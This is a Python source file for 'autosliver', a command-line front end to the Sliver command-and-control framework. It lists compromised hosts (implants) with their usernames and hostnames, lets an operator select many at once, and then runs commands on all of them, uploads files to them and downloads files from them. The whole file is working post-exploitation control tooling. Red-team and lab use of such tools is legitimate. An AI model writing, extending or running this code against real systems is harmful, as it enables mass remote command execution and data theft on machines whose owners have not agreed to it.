import sliver, asyncio
import argparse, yaml
import shlex
import inquirer as inq
from termcolor import colored
import sys, os
from prettytable import PrettyTable, TableStyle
from datetime import datetime, timezone
import gzip, io


BANNER = r'''
               __               .__  .__                    
_____   __ ___/  |_  ____  _____|  | |__|__  __ ___________ 
\__  \ |  |  \   __\/  _ \/  ___/  | |  \  \/ // __ \_  __ \
 / __ \|  |  /|  | (  <_> )___ \|  |_|  |\   /\  ___/|  | \/
(____  /____/ |__|  \____/____  >____/__| \_/  \___  >__|   
     \/                       \/                   \/       
'''


# Helper functions
def info(message):
    print(colored('[*]', 'green') + ' ' + message)

def error(message):
    print(colored('[!]', 'red') + ' ' + message)

# Argument parser
parser = argparse.ArgumentParser(description="A script to automate sliver C2 actions.")
parser.add_argument('--config', type=str, help="Config file path", default='autosliver.yaml')
args = parser.parse_args()

# Sliver setup
with open(args.config, 'r') as f:
    try:
        conf = yaml.safe_load(f)
    except yaml.YAMLError as e:
        error('Error reading yaml file')
        sys.exit(1)


# TODO: replace with library CLI class
class TerminalInterface():
    SELECT_MODE = 0
    INTERACT_MODE = 1

    def __init__(self, client):
        self.client = client
        self.sessions = []
        self.beacons = []
        self.targets = []
        self.interactions = []
        self.mode = self.SELECT_MODE

    async def update_sessions(self):
        self.sessions = await self.client.sessions()
    
    async def update_beacons(self):
        self.beacons = await self.client.beacons()

    def get_implants(self):
        return self.sessions + self.beacons

    async def pretty_print_implants(self):
        """"""
        implants = self.get_implants()
        if len(implants) == 0:
            info('None found 🙁')
            return
        
        table = PrettyTable()
        table.align = 'l'
        table.set_style(TableStyle.PLAIN_COLUMNS)
        table.field_names = [
            colored('ID', attrs=["bold"]),
            colored('Name', attrs=["bold"]),
            colored('Remote Address', attrs=["bold"]),
            colored('Hostname', attrs=["bold"]),
            colored('Username', attrs=["bold"]),
            colored('Operating System', attrs=["bold"]),
            colored('Last Message', attrs=["bold"])
        ]
        table.sortby = colored('Remote Address', attrs=["bold"])
        table.add_rows([
            [
                implant.ID[:8],
                implant.Name,
                implant.RemoteAddress,
                implant.Hostname,
                implant.Username,
                f'{implant.OS}/{implant.Arch}',
                datetime.fromtimestamp(implant.LastCheckin, tz=timezone.utc).strftime('%a %b %d %H:%M:%S UTC %Y')
            ] for implant in implants
        ])
        print(table)

    async def help(self):
        print('Commands:')
        print('=========')
        print('  sessions'.ljust(18) + 'List current sessions')
        print('  beacons'.ljust(18) + 'List current beacons')
        print('  use'.ljust(18) + 'Select targets')
        print('  interact'.ljust(18) + 'Interact with selected targets')
        print('  help'.ljust(18) + 'Print this help message')

        if self.mode == self.INTERACT_MODE:
            print('\nInteractive mode:')
            print('================')
            print('  execute'.ljust(18) + 'Execute a program on all targets')
            # print('  chmod'.ljust(18) + 'Change permissions on a file or directory')
            # print('  chown'.ljust(18) + 'Change owner on a file or directory')
            # print('  whoami'.ljust(18) + 'Get session user execution context on all targets')
            # print('  ls'.ljust(18) + 'List directory on all targets')
            # print('  pwd'.ljust(18) + 'Print working directory on all targets')
            # print('  cd'.ljust(18) + 'Change directory on all targets')
            # print('  mv'.ljust(18) + 'Move or rename a')
            # print('  rm'.ljust(18) + 'Remove a file or directory on all targets')
            # print('  cat'.ljust(18) + 'Dump file to stdout on all targets')
            # print('  mkdir'.ljust(18) + 'Make a directory on all targets')
            print('  upload'.ljust(18) + 'Upload a file to all targets')
            print('  download'.ljust(18) + 'Download a file from all targets')
            print('  interactions'.ljust(18) + 'List current interactions')
            print('  exit'.ljust(18) + 'Exit interactive mode')

    async def select_targets(self):
        # TODO: add a default/"Select all" option
        implants = self.get_implants()
        self.targets = inq.prompt([
            inq.Checkbox('targets', message='Select targets', choices=[
                (f'{implant.RemoteAddress} ({type(implant).__name__.lower()})', implant) for implant in implants
            ], default=self.targets)
        ])['targets']

    async def interact(self):
        implants = self.targets
        for implant in implants:
            if type(implant).__name__ == 'Beacon':
                interaction = await self.client.interact_beacon(implant.ID)
            elif type(implant).__name__ == 'Session':
                interaction = await self.client.interact_session(implant.ID)
            else:
                error('Invalid implant type')
                return
            self.interactions.append(interaction)
        self.mode = self.INTERACT_MODE

    async def pretty_print_interactions(self):
        if self.mode != self.INTERACT_MODE:
            error('Not in interactive mode')
            return
        implants = self.interactions
        if len(implants) == 0:
            info('None found 🙁')
            return
        
        table = PrettyTable()
        table.align = 'l'
        table.set_style(TableStyle.PLAIN_COLUMNS)
        table.field_names = [
            colored('ID', attrs=["bold"]),
            colored('Name', attrs=["bold"]),
            colored('Remote Address', attrs=["bold"]),
            colored('Hostname', attrs=["bold"]),
            colored('Username', attrs=["bold"]),
            colored('Operating System', attrs=["bold"]),
            colored('Last Message', attrs=["bold"])
        ]
        table.sortby = colored('Remote Address', attrs=["bold"])
        table.add_rows([
            [
                implant._session.ID[:8],
                implant._session.Name,
                implant._session.RemoteAddress,
                implant._session.Hostname,
                implant._session.Username,
                f'{implant._session.OS}/{implant._session.Arch}',
                datetime.fromtimestamp(implant._session.LastCheckin, tz=timezone.utc).strftime('%a %b %d %H:%M:%S UTC %Y')
            ] for implant in implants
        ])
        print(table)
    
    async def upload(self, filename, remote_path):
        info(f'Uploading {filename} to selected targets')
        with open(filename, 'rb') as f:
            data = f.read()
        for interaction in self.interactions:
            await interaction.upload(remote_path, data)

    async def download(self, filename):
        info(f'Downloading {filename} from selected targets')
        for interaction in self.interactions:
            data = await interaction.download(filename)
            if data.Encoder == 'gzip':
                gzip_data = data.Data
                with gzip.GzipFile(fileobj=io.BytesIO(gzip_data), mode="rb") as f:
                    decompressed_data = f.read()
                with open(f'{interaction._session.RemoteAddress}-{os.path.basename(filename)}', 'wb') as f:
                    f.write(decompressed_data)
            else:
                error(f'Unsupported encoder: {data.Encoder}')
                return
            
    async def execute(self, cmd):
        if self.mode != self.INTERACT_MODE:
            error('Not in interactive mode')
            return
        
        info(f'Executing command on selected targets\n')
        if len(self.interactions) == 0:
            error('No interactions selected')
        
        for interaction in self.interactions:
            parts = shlex.split(cmd)
            res = await interaction.execute(exe=parts[0], args=parts[1:], output=True)
            info(f'Output from {interaction._session.RemoteAddress}:')
            print(res.Stdout.decode())
    
    async def exit(self):
        match self.mode:
            case self.SELECT_MODE:
                sys.exit(0)
            case self.INTERACT_MODE:
                info('Exiting interactive mode')
                self.mode = self.SELECT_MODE
                self.interactions = []

    def prompt(self):
        str = '\n' + colored('autosliver', attrs=['underline'])
        if self.mode == self.INTERACT_MODE:
            str += ' (' + colored('INTERACTIVE', 'yellow') + ')'
        str +=  ' > '
        return input(str)

    async def cli(self):
        while True:
            # TODO: command history and autocomplete
            cmd = self.prompt()
            print()
            # TODO: make refreshing automatic in the background and notify/handle when session is lost
            old_implants = self.get_implants()

            await self.update_sessions()
            await self.update_beacons()

            # # TODO: untested
            for old in old_implants:
                found = False
                for new in self.get_implants():
                    if old.ID == new.ID:
                        found = True
                        break
                if not found:
                    error(f'Session from {old.RemoteAddress} lost')
                    self.targets = [target for target in self.targets if target.ID != old.ID]
                    self.interactions = [interaction for interaction in self.interactions if interaction._session.ID != old.ID]
            
            try:
                match cmd:
                    case 'sessions':
                        await self.pretty_print_implants()
                    case 'beacons':
                        await self.pretty_print_implants()
                    case 'use':
                        await self.select_targets()
                    case 'interact':
                        await self.interact()
                    case 'exit':
                        await self.exit()
                    case 'interactions':
                        await self.pretty_print_interactions()
                    case 'upload':
                        # TODO: make this a CLI argument instead (so up-arrow will work)
                        filename = inq.text('Enter local path for the file to upload')
                        remote_path = inq.text('Enter remote path for the file to upload')
                        await self.upload(filename, remote_path)
                    case 'download':
                        filename = inq.text('Enter remote path for the file to download')
                        await self.download(filename)
                    case 'execute':
                        cmd = inq.text('Enter command to execute')
                        await self.execute(cmd)
                    case 'help':
                        await self.help()
                    case _:
                        error('Invalid command')
            except Exception as e:
                error(f'Error: {e}')


# Main loop
async def main():
    # Create sliver client
    config = sliver.SliverClientConfig.parse_config_file(conf['client_config'])
    client = sliver.SliverClient(config)

    # Connect client to sliver server
    info('Connecting to sliver server...')
    await client.connect()
    info('Connected!')
    print(colored(BANNER, "blue"))

    # Start terminal interface
    terminal = TerminalInterface(client)
    await terminal.cli()


if __name__ == '__main__':
    asyncio.run(main())
